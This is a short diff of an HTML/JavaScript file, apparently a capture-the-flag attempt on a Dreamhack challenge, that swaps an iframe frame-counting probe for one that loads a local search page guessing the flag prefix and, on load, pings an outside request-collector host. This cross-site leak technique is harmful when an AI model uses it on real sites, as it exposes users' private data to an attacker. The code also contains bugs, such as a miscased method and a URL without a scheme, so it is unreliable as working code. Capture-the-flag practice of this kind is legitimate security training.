@@ -1,11 +1,7 @@
-<html>
-<head><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"></head>
-<body>
+<iframe id=a></iframe>
+<img id=b>
 <script>
-var a=document.createElement("iframe")
-a.src="http://host3.dreamhack.games:20736/search?query=Dre"
-document.body.appendChild(a)
-a.onload=function(){(console.log(a.contentWindow.frames.length))}
+  var c=document.getElementbyId(a)
+  c.src="127.0.0.1:8000/search?query=DH{"
+  c.onload=function(){b.src="https://udmjsrh.request.dreamhack.games"}
 </script>
-</body>
-</html>
